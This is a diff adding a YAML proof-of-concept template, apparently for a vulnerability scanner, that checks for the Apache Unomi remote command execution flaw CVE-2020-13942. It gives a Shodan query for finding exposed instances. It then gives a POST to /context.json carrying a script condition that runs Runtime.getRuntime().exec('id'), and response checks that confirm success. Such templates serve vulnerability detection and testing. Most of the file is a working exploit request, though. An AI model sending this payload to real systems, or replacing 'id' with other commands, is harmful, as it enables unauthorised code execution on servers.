@@ -1,0 +1,29 @@
+id: poc-yaml-apache-unomi-context-json-rce
+info:
+  name: Apache Unomi远程命令执行漏洞(CVE-2020-13942)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2020-13942
+  finger: unomi
+  shodan: body="Welcome to Apache Unomi"
+requests:
+- method: POST
+  path: /context.json
+  headers:
+    Content-Type: application/json
+  data: "{\n\"filters\": [\n{\n\"id\": \"zyljs\",\n\"filters\": [\n  {\n    \"condition\"\
+    : {\n      \"parameterValues\": {\n        \"abcd\": \"script::Runtime.getRuntime().exec('id')\"\
+    \n      },\n      \"type\": \"profilePropertyCondition\"\n    }\n  }\n]\n}\n],\n\
+    \"sessionId\": \"abcd\"\n}"
+  expression: 'status_code == 200
+
+    && contains(headers,"context-profile-id")
+
+    && contains(headers,"application/json")
+
+    && contains(body,"profileId")
+
+    '
+variables: {}
+transport: http
